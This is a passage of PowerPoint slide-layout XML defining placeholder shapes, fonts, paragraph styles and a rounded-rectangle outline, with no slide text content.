            <a:lvl1pPr defTabSz="805466" eaLnBrk="0" hangingPunct="0">
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{6D881267-4E51-466B-9328-939E0E8B313F}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="133121260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940594" y="357188"/>
            <a:ext cx="10310812" cy="865622"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="5559" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1577340"/>
            <a:ext cx="5303520" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="3"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6278880" y="1577340"/>
            <a:ext cx="5303520" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="ctr" defTabSz="806157" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="l" defTabSz="806157" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{6D377EE2-257A-41FD-B3D0-19F08223AEB0}" type="datetimeFigureOut">
              <a:rPr lang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Holder 7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr defTabSz="805466" eaLnBrk="0" hangingPunct="0">
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{5843394B-11E7-4825-B69A-6E8E7F73641D}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="84011086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a:xfrm>
            <a:off x="940594" y="357188"/>
            <a:ext cx="10310812" cy="865622"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="5559" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="ctr" defTabSz="806157" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="l" defTabSz="806157" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{A1F39D5E-AF99-406F-9A59-31CB6A91F5F8}" type="datetimeFigureOut">
              <a:rPr lang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr defTabSz="805466" eaLnBrk="0" hangingPunct="0">
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{6D3FD706-4F22-4484-B327-CCF40D5B05E0}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="145140825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10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="ctr" defTabSz="806157" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="l" defTabSz="806157" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{6DD39E4C-4E47-4AB4-89ED-E9CBD4B095E0}" type="datetimeFigureOut">
              <a:rPr lang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr defTabSz="805466" eaLnBrk="0" hangingPunct="0">
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{168DC4F8-93F7-4502-B8ED-A37198AFA07B}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10501290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4" name="bk object 16"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="344440" y="410416"/>
            <a:ext cx="11193318" cy="3251106"/>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defTabSz="715963">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="715963">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="715963">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="715963">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="715963">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="715963" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="715963" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="715963" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="715963" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1235">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="bk object 17"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="415636" y="3443008"/>
            <a:ext cx="5913198" cy="310963"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId3"/>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defTabSz="715963">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="715963">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="715963">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="715963">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="715963">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="715963" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="715963" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="715963" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="715963" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1235">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="bk object 18"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="463743" y="3461218"/>
            <a:ext cx="5816984" cy="239525"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 6204584"/>
              <a:gd name="T1" fmla="*/ 770 h 342264"/>
              <a:gd name="T2" fmla="*/ 0 w 6204584"/>
              <a:gd name="T3" fmla="*/ 271 h 342264"/>
              <a:gd name="T4" fmla="*/ 12 w 6204584"/>
              <a:gd name="T5" fmla="*/ 166 h 342264"/>
              <a:gd name="T6" fmla="*/ 42 w 6204584"/>
              <a:gd name="T7" fmla="*/ 79 h 342264"/>
              <a:gd name="T8" fmla="*/ 88 w 6204584"/>
              <a:gd name="T9" fmla="*/ 21 h 342264"/>
              <a:gd name="T10" fmla="*/ 145 w 6204584"/>
              <a:gd name="T11" fmla="*/ 0 h 342264"/>
              <a:gd name="T12" fmla="*/ 9940 w 6204584"/>
              <a:gd name="T13" fmla="*/ 0 h 342264"/>
              <a:gd name="T14" fmla="*/ 9997 w 6204584"/>
              <a:gd name="T15" fmla="*/ 21 h 342264"/>
              <a:gd name="T16" fmla="*/ 10042 w 6204584"/>
              <a:gd name="T17" fmla="*/ 79 h 342264"/>
              <a:gd name="T18" fmla="*/ 10074 w 6204584"/>
              <a:gd name="T19" fmla="*/ 166 h 342264"/>
              <a:gd name="T20" fmla="*/ 10085 w 6204584"/>
              <a:gd name="T21" fmla="*/ 271 h 342264"/>
              <a:gd name="T22" fmla="*/ 10085 w 6204584"/>
              <a:gd name="T23" fmla="*/ 770 h 342264"/>
              <a:gd name="T24" fmla="*/ 10074 w 6204584"/>
              <a:gd name="T25" fmla="*/ 875 h 342264"/>
              <a:gd name="T26" fmla="*/ 10042 w 6204584"/>
              <a:gd name="T27" fmla="*/ 961 h 342264"/>
              <a:gd name="T28" fmla="*/ 9997 w 6204584"/>
              <a:gd name="T29" fmla="*/ 1020 h 342264"/>
              <a:gd name="T30" fmla="*/ 9940 w 6204584"/>
              <a:gd name="T31" fmla="*/ 1041 h 342264"/>
              <a:gd name="T32" fmla="*/ 145 w 6204584"/>
              <a:gd name="T33" fmla="*/ 1041 h 342264"/>
              <a:gd name="T34" fmla="*/ 88 w 6204584"/>
              <a:gd name="T35" fmla="*/ 1020 h 342264"/>
              <a:gd name="T36" fmla="*/ 42 w 6204584"/>
              <a:gd name="T37" fmla="*/ 961 h 342264"/>
              <a:gd name="T38" fmla="*/ 12 w 6204584"/>
              <a:gd name="T39" fmla="*/ 875 h 342264"/>
              <a:gd name="T40" fmla="*/ 0 w 6204584"/>
              <a:gd name="T41" fmla="*/ 770 h 34226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6204584" h="342264">
                <a:moveTo>
                  <a:pt x="0" y="252710"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="89156"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7006" y="54452"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26113" y="26113"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="54452" y="7006"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="89156" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6115177" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6149881" y="7006"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6178224" y="26113"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6197335" y="54452"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6204343" y="89156"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6204343" y="252710"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6197335" y="287414"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6178224" y="315753"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6149881" y="334861"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6115177" y="341867"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="89156" y="341867"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="54452" y="334861"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26113" y="315753"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7006" y="287414"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="252710"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="C82506"/>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="bk object 19"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="432956" y="2333626"/>
            <a:ext cx="2690091" cy="310963"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId4"/>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defTabSz="715963">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="715963">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="715963">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="715963">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="715963">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="715963" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="715963" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
